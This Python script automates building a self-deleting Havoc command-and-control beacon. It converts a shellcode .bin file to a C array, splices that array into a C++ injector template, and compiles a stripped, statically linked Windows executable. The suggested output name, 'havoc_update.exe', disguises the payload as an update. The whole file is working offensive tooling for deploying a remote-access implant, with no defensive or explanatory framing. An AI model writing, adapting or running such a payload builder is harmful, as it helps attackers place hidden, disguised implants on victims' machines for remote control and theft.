#!/usr/bin/env python3
import argparse
import subprocess
import os
import shutil
import sys

def convert_bin_to_c_array(bin_file_path):
    """
    Reads a binary file and converts its content into a C-style hex array string.
    """
    try:
        with open(bin_file_path, 'rb') as f:
            binary_data = f.read()
    except FileNotFoundError:
        print(f"[!] Error: Binary file not found at '{bin_file_path}'", file=sys.stderr)
        sys.exit(1)

    if not binary_data:
        print("[!] Error: Binary file is empty.", file=sys.stderr)
        sys.exit(1)

    # Format as a C array: "0xXX, 0xYY, ..."
    hex_array = ", ".join([f"0x{byte:02x}" for byte in binary_data])
    return hex_array

def main():
    """
    Main function to orchestrate the payload creation process.
    """
    parser = argparse.ArgumentParser(
        description="Automate the creation of a self-deleting Havoc beacon.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-b", "--bin", required=True, help="Path to the input shellcode .bin file (e.g., demon.x64.bin).")
    parser.add_argument("-t", "--template", required=True, help="Path to the C++ injector template file (e.g., havoc_injector.cpp).")
    parser.add_argument("-o", "--output", required=True, help="Name of the final output executable (e.g., havoc_update.exe).")

    args = parser.parse_args()

    # --- 1. Convert Shellcode ---
    print(f"[*] Converting binary file '{args.bin}' to C-style array...")
    shellcode_string = convert_bin_to_c_array(args.bin)
    print(f"[+] Successfully converted {len(shellcode_string.split(','))} bytes of shellcode.")

    # --- 2. Inject Shellcode into Template ---
    try:
        with open(args.template, 'r') as f:
            template_code = f.read()
    except FileNotFoundError:
        print(f"[!] Error: C++ template file not found at '{args.template}'", file=sys.stderr)
        sys.exit(1)

    # Find the placeholder and replace it with the actual shellcode
    placeholder = "// Paste your C-style shellcode array from Havoc here"
    if placeholder not in template_code:
        print(f"[!] Error: Placeholder '{placeholder}' not found in the template file.", file=sys.stderr)
        sys.exit(1)

    final_code = template_code.replace(placeholder, shellcode_string)
    
    # --- 3. Write Final C++ Source and Compile ---
    temp_cpp_filename = "final_injector.cpp"
    print(f"[*] Writing final C++ code to '{temp_cpp_filename}'...")
    with open(temp_cpp_filename, 'w') as f:
        f.write(final_code)

    print(f"[*] Compiling '{temp_cpp_filename}' into '{args.output}'...")
    
    # Auto-detect compiler: native g++ on Windows (MSYS2), MinGW cross-compiler elsewhere
    compiler = "x86_64-w64-mingw32-g++"
    if sys.platform == 'win32' and shutil.which("g++"):
        compiler = "g++"
    elif not shutil.which(compiler) and shutil.which("g++"):
        compiler = "g++"

    compile_command = [
        compiler,
        "-o", args.output,
        temp_cpp_filename,
        "-lws2_32",
        "-s",
        "-Wno-write-strings",
        "-fno-exceptions",
        "-fmerge-all-constants",
        "-static-libstdc++",
        "-static-libgcc",
        "-static"
    ]

    try:
        # Run the compilation command
        result = subprocess.run(compile_command, check=True, capture_output=True, text=True)
        print(f"[+] Compilation successful! Payload created: '{args.output}'")
        if result.stdout:
            print("Compiler output:\n", result.stdout)
        if result.stderr:
            print("Compiler warnings/errors:\n", result.stderr)

    except subprocess.CalledProcessError as e:
        print("[!] Compilation failed!", file=sys.stderr)
        print("Error:", e, file=sys.stderr)
        print("Compiler output:\n", e.stdout, file=sys.stderr)
        print("Compiler errors:\n", e.stderr, file=sys.stderr)
        sys.exit(1)
    except FileNotFoundError:
        print(f"[!] Error: '{compiler}' not found. Is MinGW-w64 installed and in your PATH?", file=sys.stderr)
        sys.exit(1)
    finally:
        # --- 4. Cleanup ---
        if os.path.exists(temp_cpp_filename):
            print(f"[*] Cleaning up temporary file '{temp_cpp_filename}'...")
            os.remove(temp_cpp_filename)

if __name__ == "__main__":
    main()
